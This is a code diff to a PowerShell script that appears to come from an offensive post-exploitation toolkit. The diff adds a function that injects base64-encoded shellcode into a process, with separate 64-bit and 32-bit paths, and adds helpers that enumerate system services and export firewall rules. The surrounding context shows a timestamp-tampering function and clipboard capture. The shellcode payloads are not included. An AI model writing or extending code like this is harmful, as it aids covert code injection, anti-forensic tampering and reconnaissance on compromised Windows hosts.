@@ -642,6 +642,14 @@ elseif (($t -and [IntPtr]::size -eq 4)) {
     Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
 }
 }
+Function AutoMigrate-Always {
+if ([IntPtr]::size -eq 8){
+   Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode64))
+} 
+elseif ([IntPtr]::size -eq 4) {
+    Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
+}
+}
 Function TimeStomp($File, $Date) {
     $file=(gi $file) 
     $file.LastWriteTime=$date;
@@ -651,4 +659,16 @@ Function TimeStomp($File, $Date) {
 Function Get-Clipboard {
     add-type -a system.windows.forms
     [windows.forms.clipboard]::GetText()
+}
+Function Get-AllServices {
+    $Keys = Get-ChildItem HKLM:\System\CurrentControlSet\services; $Items = $Keys | Foreach-Object {Get-ItemProperty $_.PsPath }
+    ForEach ($Item in $Items) {$n=$Item.PSChildName;$i=$Item.ImagePath;$d=$Item.Description; echo "Name: $n `nImagePath: $i `nDescription: $d`n"}
+}
+Function Get-AllFirewallRules($path) {
+    $Rules=(New-object -comObject HNetCfg.FwPolicy2).rules
+    if ($path) {
+        $Rules | export-csv $path -NoTypeInformation
+    } else {
+        $Rules
+    }
 }
